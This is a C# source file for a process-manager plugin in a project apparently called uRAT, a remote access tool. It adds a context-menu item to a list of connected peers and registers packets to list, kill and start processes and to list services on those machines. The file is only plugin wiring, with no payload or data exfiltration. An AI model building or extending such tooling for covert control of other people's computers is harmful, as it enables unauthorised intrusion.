using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using uNet2.Channel.Events;
using uNet2.Packet;
using uNet2.Packet.Events;
using uRAT.ManagersPlugin.ProcessManager.Forms;
using uRAT.ManagersPlugin.ProcessManager.Operations;
using uRAT.ManagersPlugin.ProcessManager.Packets;
using uRAT.Server.Plugin.Server;
using uRAT.Server.Plugin.UIService;
using uRAT.Server.Plugin.UIService.Services;

namespace uRAT.ManagersPlugin.ProcessManager
{
    class ProcessManagerPlugin : IServerPlugin
    {
        public string MenuTitle
        {
            get { return null; }
        }

        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new RefreshProcessesPacket(),
                    new ProcessInformationPacket(),
                    new KillProcessPacket(),
                    new StartProcessPacket(),
                    new ServiceInformationPacket(),
                    new RefreshServicesPacket()
                };
            }
        }

        public void Initialize()
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            var tsItm = new ToolStripMenuItem("Process manager");
            tsItm.Click += tsItm_Click;
            connectionList.AddContextMenuItem(tsItm);
        }

        void tsItm_Click(object sender, EventArgs e)
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            connectionList.GetSelectedItems().ForEach(itm =>
            {
                var op = itm.AssociatedChannel.CreateOperation<ProcessManagerOperation>(itm.AssociatedPeer.Identity.Guid);
                new ProcessManagerForm(itm.SubItems[0].Text, op).Show();
            });
        }


        public void OnPacketReceived(ServerPacketEventArgs e)
        {

        }

        public void OnPeerDisconnected(ChannelEventArgs e)
        {

        }

        public void OnPeerConnected(ChannelEventArgs e)
        {

        }
    }
}
